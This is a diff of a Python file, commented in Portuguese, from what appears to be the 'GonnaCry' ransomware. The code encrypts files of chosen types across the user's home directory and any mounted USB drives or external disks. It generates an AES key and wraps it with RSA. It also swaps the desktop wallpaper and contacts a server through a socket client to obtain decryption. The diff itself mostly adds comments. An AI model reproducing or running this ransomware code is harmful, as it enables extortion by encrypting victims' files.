@@ -17,29 +17,31 @@ from SRSA import *
 
 
 # ponto de partida da criptografia
-def menu(senha_AES,modo):
+# modo=1 -> criptografa
+# modo!=1 -> descriptografa
+def menu(senha_AES, modo):
     # caminho de partida
     home = os.environ['HOME']
-    # lista com os tipos
+    # lista com os tipos de arquivos a serem criptografados
     f = open('tipos_arquivos.txt','r')
     tipos = f.read()
     tipos = tipos.split('\n')
 
     f = open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
     a = f.read()
-
+    # começa a criptografar os arquivos e depois os pendrives conectados
     listar(senha_AES,home,tipos,modo)
     listar_media(senha_AES,modo,tipos)
 
-
-def listar_media(senha_AES,modo,tipos_arq):
+# função que lista e criptografa HD'S externos e pendrives
+def listar_media(senha_AES, modo, tipos_arq):
     print('Procurando por pendrives/HDs')
     caminho = '/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
         listar(senha_AES,caminho,tipos_arq,modo)
 
 
-
+# função que lista todos os arquivos e criptografa ou descriptografa
 def listar(chave_AES,diretorio, tipos_arq, modo):
     atual = os.getcwd()
     if(modo == 1): # criptografa
@@ -67,7 +69,7 @@ def listar(chave_AES,diretorio, tipos_arq, modo):
                     a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                     descriptografa(chave_AES,a)
 
-
+# conexão com o servidor -> ainda a ser pensado como fazer ...
 def client(IP_serv):
     try:
         s = socket.socket()
@@ -83,9 +85,9 @@ def client(IP_serv):
     f.close()
     s.close()
 
+# GERA SENHA AES que vai criptografar os arquivos
+# Salva senha em arquivo.txt
 def gera_chave_AES():
-    # GERA SENHA AES que vai criptografar os arquivos
-    # Salva senha em arquivo.txt
     tamanho=256 # bytes
     caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
     senha = ''
@@ -101,11 +103,12 @@ def gera_chave_AES():
     f.close()
     return senha
 
+# função que troca o plano de fundo do compiuter
 def change_background():
     os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')
 
+# função que criptografa tudo
 def crypto_all():
-
     AES_key = gera_chave_AES()
     print('[*] Chave AES gerada')
     #menu(AES_key,1) # -> criptografa tudo
@@ -113,7 +116,7 @@ def crypto_all():
     print('[*] Senha AES criptografado com chave RSA')
     RSA_to_SRSA()
     print('[*] Chave privada do cliente criptografada')
-
+'''
     # salva o caminho do GonnaCry
     a = os.getcwd()
     desktop = '/Área\ de\ Trabalho/'
@@ -128,7 +131,9 @@ def crypto_all():
         f.write(a)
         shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
     print('[*] Caminho salvo')
+'''
 
+# função que descriptografa tudo após ter falado com o servidor
 def decrypt_all():
     client('localhost')
     SRSA_to_RSA()
